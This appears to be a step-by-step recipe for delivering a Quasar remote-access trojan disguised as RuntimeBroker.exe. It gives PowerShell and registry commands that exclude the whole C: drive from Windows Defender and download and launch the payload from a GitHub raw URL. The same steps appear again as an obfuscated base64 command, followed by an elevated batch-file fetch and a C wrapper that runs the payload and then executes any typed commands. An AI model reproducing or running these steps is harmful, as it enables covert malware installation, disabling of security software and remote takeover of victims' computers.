
-----------------------

Make a Runtimebroker.exe file with quaser rat


upload the Runtimebroker.exe in to a github repo


Powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\
Invoke-WebRequest -OutFile $env:temp\RuntimeBroker.exe -Uri <use your git repo >
start $env:temp\RuntimeBroker.exe

encode it with UTF16LE


make a Am.bat file 

Powershell -w h -enc UABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAAKAFIARQBHACAAQQBEAEQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABFAHgAYwBsAHUAcwBpAG8AbgBzAFwAUABhAHQAaABzACIAIAAvAHYAIABDADoAXAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgB0AGUAbQBwAFwAUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AQQBSAFQASQBDAEYATwBYADEAMgAzADQALwBUAFgATwBOAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALwBSAHUAbgB0AGkAbQBlAEIAcgBvAGsAZQByAC4AZQB4AGUACgBzAHQAYQByAHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAFIAdQBuAHQAaQBtAGUAQgByAG8AawBlAHIALgBlAHgAZQA=

upload the Am.bat in to github repo also


Invoke-WebRequest -OutFile $env:Temp\Am.bat -Uri <your git url>
powershell "start $env:temp\Am.bat -Verb RunAs" 


encode it 

and paste it in 
 
make a main.c file

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
    char command[20];

    system("<paste the code>");

    while(1){
    printf("\n\n");
    scanf("%s", &command);
    system(command);
    }

    return 0;
}






